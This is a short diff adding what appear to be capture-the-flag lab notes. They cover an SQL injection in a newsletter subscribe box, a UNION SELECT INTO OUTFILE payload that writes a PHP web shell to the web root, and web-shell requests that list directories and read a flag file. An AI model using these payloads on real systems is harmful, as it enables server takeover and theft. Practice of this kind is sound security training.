@@ -1,0 +1,18 @@
+URL encoder
+https://meyerweb.com/eric/tools/dencoder/
+
+In the mailletter subscribe box column no.5 is the correct column
+' UNION SELECT null,null,null,null,users(),null -- //
+
+Inject webshell
+' UNION SELECT null,null,null,null,"<?php system($_GET['cmd']);?>",null INTO OUTFILE "/var/www/html/webshell.php" -- //
+
+Access to webshell
+http://<ip>/webshell.php?cmd=id
+!!Success
+
+Find the flag
+http://<ip>/webshell.php?cmd=pwd
+http://<ip>/webshell.php?cmd=ls
+http://<ip>/webshell.php?cmd=ls ../
+http://<ip>/webshell.php?cmd=cat ../flag.txt
